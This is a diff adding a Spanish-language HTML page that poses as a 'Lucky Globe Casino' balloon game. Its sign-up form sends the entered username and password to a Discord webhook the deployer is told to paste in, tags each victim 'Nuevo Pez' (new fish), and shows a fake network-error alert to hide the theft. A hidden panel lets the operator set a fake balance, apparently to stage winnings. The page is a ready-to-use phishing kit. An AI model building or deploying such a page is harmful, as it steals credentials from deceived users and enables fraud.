@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lucky Globe Casino</title>
+    <style>
+        body { background: #0a0a0a; color: #fff; font-family: sans-serif; text-align: center; margin: 0; }
+        .header { background: #1a1a1a; padding: 15px; border-bottom: 2px solid #d4af37; }
+        #saldo-txt { color: #00ff00; font-size: 1.5em; }
+        #globo { 
+            width: 120px; height: 150px; background: radial-gradient(circle, #ff4d4d, #900); 
+            border-radius: 50% 50% 50% 50% / 40% 40% 60% 60%; margin: 40px auto; 
+            cursor: pointer; transition: transform 0.2s; 
+        }
+        #admin-panel { display: none; background: #222; border: 1px solid gold; padding: 20px; margin: 20px; }
+        .reg-box { background: #151515; padding: 20px; border-radius: 10px; max-width: 300px; margin: 20px auto; }
+        input { width: 80%; padding: 10px; margin: 5px; background: #000; color: white; border: 1px solid #444; }
+        button { background: gold; color: black; padding: 10px; border: none; font-weight: bold; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+<div class="header">
+    <h1>LUCKY GLOBE 🎈</h1>
+    <div id="saldo-txt">Saldo: $<span id="val-saldo">0.00</span></div>
+</div>
+
+<div id="globo" onclick="jugar()"></div>
+<h2 id="msg">¡Infla el globo!</h2>
+
+<div class="reg-box">
+    <h4>REGÍSTRATE PARA COBRAR</h4>
+    <input type="text" id="u" placeholder="Usuario">
+    <input type="password" id="p" placeholder="Contraseña">
+    <button onclick="enviar()">CREAR CUENTA</button>
+</div>
+
+<p onclick="verAdmin()" style="color:#222;">USUARIOS: 1,402</p>
+
+<div id="admin-panel">
+    <h3>PANEL ADMIN</h3>
+    <input type="number" id="n-saldo" placeholder="Nuevo Saldo">
+    <button onclick="setS()">CARGAR</button>
+</div>
+
+<script>
+    let s = 0; let c = 0; let a = 0;
+    function jugar() {
+        c++;
+        if(Math.random() < (c * 0.1)) {
+            document.getElementById('globo').style.transform = "scale(0)";
+            alert("¡BOOM! Perdiste.");
+            c = 0; document.getElementById('globo').style.transform = "scale(1)";
+        } else {
+            document.getElementById('globo').style.transform = `scale(${1 + (c*0.2)})`;
+            document.getElementById('msg').innerText = "Multiplicador: x" + (1 + c*0.5).toFixed(2);
+        }
+    }
+    function verAdmin() { a++; if(a >= 5) document.getElementById('admin-panel').style.display="block"; }
+    function setS() { s = parseFloat(document.getElementById('n-saldo').value); document.getElementById('val-saldo').innerText = s; }
+    
+    function enviar() {
+        const user = document.getElementById('u').value;
+        const pass = document.getElementById('p').value;
+        const hook = "TU_WEBHOOK_AQUI"; // <-- PEGA AQUÍ TU WEBHOOK DE DISCORD
+
+        fetch(hook, {
+            method: "POST",
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({content: `🔔 **Nuevo Pez:**\n👤 User: ${user}\n🔑 Pass: ${pass}`})
+        }).then(() => { alert("Error de red. Intenta de nuevo."); });
+    }
+</script>
+</body>
+</html>
